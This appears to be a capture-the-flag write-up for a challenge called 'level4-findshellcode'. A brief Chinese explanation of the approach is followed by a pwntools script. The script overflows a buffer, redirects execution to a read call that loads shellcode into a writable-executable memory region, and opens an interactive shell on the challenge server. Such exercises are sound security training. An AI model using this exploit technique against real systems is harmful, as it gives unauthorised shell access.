# level4-findshellcode
#### 思路：用gdb查看内存，发现有一rwx段，可以先溢出到读函数，将shellcode读到此内存段,再将读函数的返回跳转到这段内存。
```python
from pwn import *
r = remote("pwn.sixstars.team","22004")

start_s = r.recv()

sh= asm(shellcraft.sh())

read_addr = p32(0x80480fd)
buff_addr = p32(0x8049100)
payload = 'a'*0x30  + read_addr +buff_addr + p32(0) + buff_addr + p32(0x100)
pay2 = payload  + 'a'*(0x80-len(payload))
r.send(pay2)

s = r.recv()
r.send(sh+ 'a'*(0x100-len(sh)))
r.sendline(sh)
r.interactive()
```
